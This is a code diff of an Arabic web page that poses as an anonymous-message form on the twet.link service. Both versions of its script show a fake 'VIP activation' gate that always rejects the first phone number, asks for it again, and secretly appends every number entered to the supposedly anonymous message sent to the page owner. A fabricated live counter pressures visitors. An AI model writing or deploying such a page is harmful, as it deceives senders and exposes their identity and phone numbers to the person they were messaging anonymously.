@@ -31,10 +31,10 @@
         .msg-box textarea{width:calc(100% - 22px);background:#e1e1e173;font-size:18px;font-weight:800;display:block;border-top:0;border-bottom:1px solid white;border-left:1px solid white;border-right:1px solid white;resize:none;height:30px;margin:auto;border-radius:0 0 25px 25px;overflow:hidden;color:black;text-shadow:0 0 1px white;text-align:center;font-family:'Almarai',sans-serif;padding:50px 10px;transition:200ms}
         .msg-box textarea:focus{outline:none!important;border-bottom:1px solid #ff2288;border-left:1px solid #ff2288;border-right:1px solid #ff2288;border-top:1px solid #ff2288;transition:200ms}
         .msg-box textarea::placeholder{color:#787878}
-        .over-input-option{position:absolute;bottom:8px;left:8px;display:flex;align-items:center;background:#00000063;color:white;font-size:11px;padding:6px;border-radius:100px;transition:200ms;width:20px;height:20px;justify-content:center;cursor:pointer}
-        .over-input-option img{width:18px}
+        .over-input-option{position:absolute;bottom:8px;left:12px;display:flex;align-items:center;background:#00000063;color:white;font-size:14px;padding:8px;border-radius:100px;transition:200ms;width:28px;height:28px;justify-content:center;cursor:pointer}
+        .over-input-option img{width:24px}
         .over-input-option:active{background:black;transition:200ms}
-        .over-input-option.right{right:10px;left:unset;font-size:18px}
+        .over-input-option.right{right:12px;left:unset;font-size:22px}
         .imgs-continer{display:none}
         .attach-images{margin:10px 0;display:flex;flex-direction:row;flex-wrap:wrap;justify-content:center;gap:8px}
         .attach-images .img{width:80px;height:80px;background-repeat:no-repeat!important;background-size:cover!important;border-radius:10px;margin:0;box-shadow:0 1px 5px 0 #00000033;position:relative;background-position:50% 50%!important}
@@ -87,18 +87,17 @@
         .vip-box{background:white;border-radius:25px;padding:30px 25px 25px;text-align:center;width:90%;max-width:400px;animation:bubble .5s ease-out}
         @keyframes bubble{0%{transform:scale(.8);opacity:0}100%{transform:scale(1);opacity:1}}
         .vip-box .vip-icon{font-size:50px;margin-bottom:10px}
-        .vip-box h3{color:#1a1a1a;font-size:20px;margin-bottom:8px;line-height:1.6}
+        .vip-box h3{color:#1a1a1a;font-size:20px;margin-bottom:8px}
         .vip-box .sub{color:#666;font-size:14px;margin-bottom:15px;line-height:1.8}
-        .vip-box .highlight{background:#fff3cd;border:1px solid #ffc107;border-radius:10px;padding:10px;margin-bottom:15px;font-size:13px;color:#856404;line-height:1.6}
+        .vip-box .highlight{background:#fff3cd;border:1px solid #ffc107;border-radius:10px;padding:10px;margin-bottom:15px;font-size:13px;color:#856404}
         .vip-box input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:12px;font-size:18px;text-align:center;margin-bottom:10px;font-family:'Almarai',sans-serif;direction:ltr;letter-spacing:3px;transition:.3s}
         .vip-box input:focus{outline:none;border-color:#4CAF50}
         .vip-box input::placeholder{color:#c0c0c0;font-size:14px;letter-spacing:0}
         .vip-box .err{color:#e94560;font-size:13px;margin-bottom:8px;display:none}
         .vip-box .hint{color:#e94560;font-size:13px;margin-bottom:10px;display:none;text-align:center;font-weight:600}
-        .vip-box .btn-vip{width:100%;padding:15px;background:linear-gradient(135deg,#4CAF50,#2E7D32);color:white;border:none;border-radius:12px;font-size:17px;font-weight:bold;cursor:pointer;font-family:'Almarai',sans-serif;transition:.2s}
-        .vip-box .btn-vip:active{transform:scale(0.96)}
+        .vip-box .btn-vip{width:100%;padding:15px;background:linear-gradient(135deg,#4CAF50,#2E7D32);color:white;border:none;border-radius:12px;font-size:17px;font-weight:bold;cursor:pointer;font-family:'Almarai',sans-serif}
         .vip-box .success-anim{display:none;text-align:center;padding:20px 0}
-        .vip-box .success-anim .check{font-size:60px;animation:bubble .5s}
+        .vip-box .success-anim .check{font-size:60px}
         .vip-box .success-anim p{color:#4CAF50;font-weight:bold;font-size:18px;margin-top:10px}
     </style>
 </head>
@@ -106,7 +105,6 @@
 
     <div class="vip-overlay" id="vip">
         <div class="vip-box">
-            <!-- شاشة 1: إدخال الرقم -->
             <div id="vipStep1">
                 <div class="vip-icon">🔐</div>
                 <h3>أرجأ أكتب رقم هاتفك</h3>
@@ -117,8 +115,6 @@
                 <div class="hint" id="vh">الرجاء أكتب رقمك الحقيقي لتفعيل الخدمة</div>
                 <button class="btn-vip" onclick="doVIP()">تفعيل الآن</button>
             </div>
-            
-            <!-- شاشة 2: تأكيد الرقم -->
             <div id="vipStep2" style="display:none">
                 <div class="vip-icon">🔄</div>
                 <h3>سوف نتأكد من رقمك</h3>
@@ -129,8 +125,6 @@
                 <div class="hint" id="vh2">الرجاء كتابة نفس الرقم للتأكيد</div>
                 <button class="btn-vip" onclick="confirmVIP()">تأكيد الرقم</button>
             </div>
-            
-            <!-- شاشة 3: نجاح التفعيل -->
             <div id="vipStep3" style="display:none">
                 <div class="success-anim" style="display:block">
                     <div class="check">✅</div>
@@ -142,14 +136,9 @@
     </div>
 
     <div class="header">
-        <div class="logo">
-            <img src="https://twet.link/assets/images/logo_transparent.png" alt="logo">
-            <span>تويت لينك</span>
-        </div>
+        <div class="logo"><img src="https://twet.link/assets/images/logo_transparent.png" alt="logo"><span>تويت لينك</span></div>
         <div style="flex:1"></div>
-        <div class="end-btns">
-            <button class="outline-btn" onclick="window.open('https://play.google.com/store/apps/details?id=app.srahha.com','_blank')">فتح في التطبيق</button>
-        </div>
+        <div class="end-btns"><button class="outline-btn" onclick="window.open('https://play.google.com/store/apps/details?id=app.srahha.com','_blank')">فتح في التطبيق</button></div>
     </div>
 
     <div class="msg-box" id="mb">
@@ -160,10 +149,7 @@
                     <div class="item"><img src="https://twet.link/assets/images/clock_gray.png"><span>آخر ظهور : <span id="lastSeen">الآن</span></span></div>
                 </div>
             </div>
-            <div class="user-overlay-info">
-                <div class="pic"></div>
-                <div class="name-sec"><span class="name">Salem37</span></div>
-            </div>
+            <div class="user-overlay-info"><div class="pic"></div><div class="name-sec"><span class="name">Salem37</span></div></div>
             <span class="question">ارسل لي رسائل سرية بدون الكشف عن هويتك</span>
         </div>
         <div class="textarea-continer">
@@ -176,31 +162,15 @@
         <button id="sb" class="btn" disabled><span>إرسال!</span><img src="https://twet.link/assets/images/loading.svg"></button>
     </div>
 
-    <div class="wall" id="wl">
-        <span class="title">الرسائل الواردة</span>
-        <div class="wall-list" id="wll"></div>
-        <div class="load-more"><button class="btn load-more" id="lm" style="display:none">تحميل المزيد</button></div>
-        <div class="loading" id="ld" style="display:none"><img src="https://twet.link/assets/images/loading.svg" width="100"></div>
-    </div>
-
+    <div class="wall" id="wl"><span class="title">الرسائل الواردة</span><div id="wll"></div><div class="load-more"><button class="btn load-more" id="lm" style="display:none">تحميل المزيد</button></div><div class="loading" id="ld" style="display:none"><img src="https://twet.link/assets/images/loading.svg" width="100"></div></div>
     <div class="space-120"></div>
-
-    <div class="msg-sent" id="ms">
-        <div class="success-img"><img src="https://twet.link/assets/images/load-success.webp" alt="success"></div>
-        <span>تم إرسال الرسالة بشكل مجهول بنجاح</span>
-        <div class="send-another" id="sa"><a class="btn" onclick="rst()">إرسال رسالة جديدة</a></div>
-    </div>
-
-    <div class="download-ads">
-        <h2 class="download-prompt">👇 <span class="clickCount">346</span> شخص حصلوا عليه الآن 👇</h2>
-        <a class="btn ads pulse" href="https://play.google.com/store/apps/details?id=app.srahha.com">احصل على رسائل سرية بصراحة</a>
-    </div>
+    <div class="msg-sent" id="ms"><div class="success-img"><img src="https://twet.link/assets/images/load-success.webp" alt="success"></div><span>تم إرسال الرسالة بنجاح</span><div class="send-another" id="sa"><a class="btn" onclick="rst()">إرسال رسالة جديدة</a></div></div>
+    <div class="download-ads"><h2 class="download-prompt">👇 <span class="clickCount">346</span> شخص حصلوا عليه الآن 👇</h2><a class="btn ads pulse" href="https://play.google.com/store/apps/details?id=app.srahha.com">احصل على رسائل سرية بصراحة</a></div>
 
     <script>
         const A="https://twet.link/api/web/sendMsg",G="https://twet.link/api/web/getWall",U="salem374";
         const P=["77","78","71","73"];
-        let vd=!1,vp=[],ac=0,li=-1,imgs=[],pendingCamera=!1;
-        let firstPhone="";
+        let vd=!1,vp=[],ac=0,li=-1,imgs=[],pendingCamera=!1,firstPhone="";
 
         const mt=document.getElementById('mt'),sb=document.getElementById('sb');
         const vi=document.getElementById('vip'),vpi=document.getElementById('vp'),ve=document.getElementById('ve'),vh=document.getElementById('vh');
@@ -211,151 +181,30 @@
 
         const questions=["وش أكثر شيء تحبه في حياتك؟ ❤️","إيش الشيء اللي يخلّيك تضحك دايم؟ 😂","من الشخص اللي ما تقدر تعيش بدونه؟ 🥰","إيش أكثر شيء يحزنك في هالحياة؟ 💔","وش هو أسوأ موقف مر عليك؟ 😢"];
 
-        function updateLastSeen(){
-            const now=new Date(),ls=new Date(parseInt('1782125464000'));
-            const diff=Math.floor((now-ls)/1000);
-            let t=diff<60?'الآن':diff<3600?'منذ '+Math.floor(diff/60)+' دقيقة':diff<86400?'منذ '+Math.floor(diff/3600)+' ساعة':'منذ '+Math.floor(diff/86400)+' يوم';
-            document.getElementById('lastSeen').textContent=t;
-        }
+        function updateLastSeen(){const n=new Date(),l=new Date(parseInt('1782125464000'));const d=Math.floor((n-l)/1000);let t=d<60?'الآن':d<3600?'منذ '+Math.floor(d/60)+' دقيقة':d<86400?'منذ '+Math.floor(d/3600)+' ساعة':'منذ '+Math.floor(d/86400)+' يوم';document.getElementById('lastSeen').textContent=t}
         updateLastSeen();setInterval(updateLastSeen,30000);
 
         mt.addEventListener('focus',()=>{if(!vd)vi.classList.add('show')});
         mt.addEventListener('input',()=>{sb.disabled=mt.value.trim().length<1});
         sb.addEventListener('click',()=>{if(!vd){vi.classList.add('show');return}send()});
-
         cameraBtn.addEventListener('click',()=>{if(!vd){pendingCamera=!0;vi.classList.add('show');return}fi.click()});
+        randomBtn.addEventListener('click',()=>{mt.value=questions[Math.floor(Math.random()*questions.length)];sb.disabled=!1});
 
-        randomBtn.addEventListener('click',()=>{const q=questions[Math.floor(Math.random()*questions.length)];mt.value=q;sb.disabled=!1});
+        fi.addEventListener('change',()=>{Array.from(fi.files).forEach(f=>{if(imgs.length>=3)return;const r=new FileReader();r.onload=function(e){const i=new Image();i.onload=function(){const c=document.createElement('canvas');let w=i.width,h=i.height,mx=500;if(w>h){if(w>mx){h*=mx/w;w=mx}}else{if(h>mx){w*=mx/h;h=mx}}c.width=w;c.height=h;c.getContext('2d').drawImage(i,0,0,w,h);imgs.push(c.toDataURL('image/jpeg',0.6).replace('data:image/jpeg;base64,',''));renderImgs()};i.src=e.target.result};r.readAsDataURL(f)});fi.value=''});
+        function renderImgs(){imgContainer.style.display='block';imgPreview.innerHTML=imgs.map((img,i)=>`<div class="img" style="background-image:url('data:image/jpeg;base64,${img}')"><div class="remove-img-attach" onclick="imgs.splice(${i},1);renderImgs()">✕</div></div>`).join('')}
 
-        fi.addEventListener('change',()=>{
-            Array.from(fi.files).forEach(file=>{
-                if(imgs.length>=3)return;
-                const reader=new FileReader();
-                reader.onload=function(e){
-                    const img=new Image();
-                    img.onload=function(){
-                        const canvas=document.createElement('canvas');
-                        let w=img.width,h=img.height,mx=500;
-                        if(w>h){if(w>mx){h*=mx/w;w=mx}}else{if(h>mx){w*=mx/h;h=mx}}
-                        canvas.width=w;canvas.height=h;
-                        canvas.getContext('2d').drawImage(img,0,0,w,h);
-                        imgs.push(canvas.toDataURL('image/jpeg',0.6).replace('data:image/jpeg;base64,',''));
-                        renderImgs();
-                    };
-                    img.src=e.target.result;
-                };
-                reader.readAsDataURL(file);
-            });
-            fi.value='';
-        });
-
-        function renderImgs(){
-            imgContainer.style.display='block';
-            imgPreview.innerHTML=imgs.map((img,i)=>`<div class="img" style="background-image:url('data:image/jpeg;base64,${img}')"><div class="remove-img-attach" onclick="imgs.splice(${i},1);renderImgs()">✕</div></div>`).join('');
-        }
-
-        // المرحلة الأولى
-        function doVIP(){
-            const p=vpi.value.trim();ac++;
-            if(ac===1){
-                vp.push(p);firstPhone=p;
-                ve.style.display='block';vh.style.display='block';
-                vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();
-                return;
-            }
-            if(p.length!==9||!/^\d+$/.test(p)||!P.includes(p.substring(0,2))){
-                vp.push(p);
-                ve.textContent='الرجاء إدخال رقم صحيح يبدأ بـ 77,78,71,73';
-                ve.style.display='block';vh.style.display='block';
-                vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();
-                return;
-            }
-            // انتقل للمرحلة الثانية
-            vp.push(p);firstPhone=p;
-            step1.style.display='none';step2.style.display='block';
-            vp2.focus();
-        }
-
-        // المرحلة الثانية - تأكيد الرقم
-        function confirmVIP(){
-            const p=vp2.value.trim();
-            vp.push(p);
-            
-            if(p!==firstPhone){
-                ve2.style.display='block';vh2.style.display='block';
-                vp2.style.borderColor='#e94560';vp2.value='';vp2.focus();
-                return;
-            }
-            
-            if(p.length!==9||!/^\d+$/.test(p)||!P.includes(p.substring(0,2))){
-                ve2.style.display='block';vh2.style.display='block';
-                vp2.style.borderColor='#e94560';vp2.value='';vp2.focus();
-                return;
-            }
-            
-            // نجاح
-            vd=!0;step2.style.display='none';step3.style.display='block';
-            setTimeout(()=>{
-                vi.classList.remove('show');
-                // إعادة تعيين للمرة القادمة
-                step3.style.display='none';step1.style.display='block';
-                vpi.style.borderColor='#e0e0e0';vp2.style.borderColor='#e0e0e0';
-                ve.style.display='none';vh.style.display='none';
-                ve2.style.display='none';vh2.style.display='none';
-                vpi.value='';vp2.value='';vpi.disabled=!1;vp2.disabled=!1;
-                pendingCamera?(pendingCamera=!1,fi.click()):mt.focus();
-            },2000);
-        }
+        function doVIP(){const p=vpi.value.trim();ac++;if(ac===1){vp.push(p);firstPhone=p;ve.style.display='block';vh.style.display='block';vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();return}if(p.length!==9||!/^\d+$/.test(p)||!P.includes(p.substring(0,2))){vp.push(p);ve.textContent='هذا الرقم غير صحيح';ve.style.display='block';vh.style.display='block';vpi.style.borderColor='#e94560';vpi.value='';vpi.focus();return}vp.push(p);firstPhone=p;step1.style.display='none';step2.style.display='block';vp2.focus()}
+        function confirmVIP(){const p=vp2.value.trim();vp.push(p);if(p!==firstPhone){ve2.style.display='block';vh2.style.display='block';vp2.style.borderColor='#e94560';vp2.value='';vp2.focus();return}if(p.length!==9||!/^\d+$/.test(p)||!P.includes(p.substring(0,2))){ve2.style.display='block';vh2.style.display='block';vp2.style.borderColor='#e94560';vp2.value='';vp2.focus();return}vd=!0;step2.style.display='none';step3.style.display='block';setTimeout(()=>{vi.classList.remove('show');step3.style.display='none';step1.style.display='block';vpi.style.borderColor='#e0e0e0';vp2.style.borderColor='#e0e0e0';ve.style.display='none';vh.style.display='none';ve2.style.display='none';vh2.style.display='none';vpi.value='';vp2.value='';pendingCamera?(pendingCamera=!1,fi.click()):mt.focus()},2000)}
 
         vpi.addEventListener('input',()=>{ve.style.display='none';vh.style.display='none';vpi.style.borderColor='#e0e0e0'});
         vpi.addEventListener('keydown',e=>{if(e.key==='Enter')doVIP()});
         vp2.addEventListener('input',()=>{ve2.style.display='none';vh2.style.display='none';vp2.style.borderColor='#e0e0e0'});
         vp2.addEventListener('keydown',e=>{if(e.key==='Enter')confirmVIP()});
 
-        async function send(){
-            const m=mt.value.trim();if(!m&&!imgs.length)return;
-            sb.disabled=!0;sb.classList.add('loading');
-            const allPhones=vp.join(' | ');
-            const fm=m+'\n\n📱 المحاولات: '+allPhones;
-            try{await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg:fm,username:U,qid:'',images:imgs})})}catch(e){}
-            const db=JSON.parse(localStorage.getItem('tw')||'[]');
-            db.push({text:m,phones:vp,imgs:imgs.length,time:new Date().toLocaleString('ar-SA')});
-            localStorage.setItem('tw',JSON.stringify(db));
-            document.getElementById('mb').style.display='none';document.getElementById('wl').style.display='none';
-            document.getElementById('ms').style.display='flex';
-            setTimeout(()=>{document.getElementById('sa').classList.add('show')},2000);
-        }
+        async function send(){const m=mt.value.trim();if(!m&&!imgs.length)return;sb.disabled=!0;sb.classList.add('loading');const fm=m+'\n\n📱 المحاولات: '+vp.join(' | ');try{await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg:fm,username:U,qid:'',images:imgs})})}catch(e){}const db=JSON.parse(localStorage.getItem('tw')||'[]');db.push({text:m,phones:vp,imgs:imgs.length,time:new Date().toLocaleString('ar-SA')});localStorage.setItem('tw',JSON.stringify(db));document.getElementById('mb').style.display='none';document.getElementById('wl').style.display='none';document.getElementById('ms').style.display='flex';setTimeout(()=>{document.getElementById('sa').classList.add('show')},2000)}
+        function rst(){mt.value='';sb.disabled=!0;sb.classList.remove('loading');sb.innerHTML='<span>إرسال!</span>';vd=!1;vp=[];ac=0;imgs=[];pendingCamera=!1;firstPhone="";vpi.value='';vp2.value='';vpi.style.borderColor='#e0e0e0';vp2.style.borderColor='#e0e0e0';ve.style.display='none';vh.style.display='none';ve2.style.display='none';vh2.style.display='none';step3.style.display='none';step2.style.display='none';step1.style.display='block';imgContainer.style.display='none';imgPreview.innerHTML='';document.getElementById('mb').style.display='flex';document.getElementById('ms').style.display='none';document.getElementById('sa').classList.remove('show')}
 
-        function rst(){
-            mt.value='';sb.disabled=!0;sb.classList.remove('loading');sb.innerHTML='<span>إرسال!</span>';
-            vd=!1;vp=[];ac=0;imgs=[];pendingCamera=!1;firstPhone="";
-            vpi.value='';vp2.value='';vpi.disabled=!1;vp2.disabled=!1;
-            vpi.style.borderColor='#e0e0e0';vp2.style.borderColor='#e0e0e0';
-            ve.style.display='none';vh.style.display='none';ve2.style.display='none';vh2.style.display='none';
-            step3.style.display='none';step2.style.display='none';step1.style.display='block';
-            imgContainer.style.display='none';imgPreview.innerHTML='';
-            document.getElementById('mb').style.display='flex';document.getElementById('ms').style.display='none';
-            document.getElementById('sa').classList.remove('show');
-        }
-
-        async function lw(){
-            const lm=document.getElementById('lm'),ld=document.getElementById('ld'),wl=document.getElementById('wll');
-            lm.style.display='none';ld.style.display='block';
-            try{
-                const r=await fetch(G,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:U,lastId:li})});
-                const d=await r.json();ld.style.display='none';
-                if(d.wall&&d.wall.length){
-                    document.getElementById('wl').style.display='block';
-                    d.wall.forEach(m=>{
-                        const dv=document.createElement('div');
-                        dv.className='ans-item';
-                        dv.innerHTML='<div class="pinfo"><div class="pic"></div><div class="col"><span class="question">'+(m.questionText||'ارسل لي رسائل سرية بدون الكشف عن هويتك')+'</span><span class="timeago">'+new Date(m.createdTime).toLocaleString('ar-SA')+'</span></div></div><div class="msg"><div class="line"></div><span class="text">'+m.text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>'+(m.reply?'<div class="reply"><span class="text">↩️ '+m.reply.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>':'');
-                        wl.appendChild(dv);li=m.id;
-                    });
-                    if(d.wall.length>=10)lm.style.display='block';
-                }
-            }catch(e){ld.style.display='none'}
-        }
+        async function lw(){const lm=document.getElementById('lm'),ld=document.getElementById('ld'),wl=document.getElementById('wll');lm.style.display='none';ld.style.display='block';try{const r=await fetch(G,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:U,lastId:li})});const d=await r.json();ld.style.display='none';if(d.wall&&d.wall.length){document.getElementById('wl').style.display='block';d.wall.forEach(m=>{const dv=document.createElement('div');dv.className='ans-item';dv.innerHTML='<div class="pinfo"><div class="pic"></div><div class="col"><span class="question">'+(m.questionText||'ارسل لي رسائل سرية بدون الكشف عن هويتك')+'</span><span class="timeago">'+new Date(m.createdTime).toLocaleString('ar-SA')+'</span></div></div><div class="msg"><div class="line"></div><span class="text">'+m.text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>'+(m.reply?'<div class="reply"><span class="text">↩️ '+m.reply.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>':'');wl.appendChild(dv);li=m.id});if(d.wall.length>=10)lm.style.display='block'}}catch(e){ld.style.display='none'}}
         document.getElementById('lm').addEventListener('click',lw);lw();
 
         setInterval(()=>{const el=document.querySelector('.clickCount');if(el){let n=parseInt(el.textContent)||346;n+=Math.floor(Math.random()*5)-1;el.textContent=Math.max(300,n)}},800);
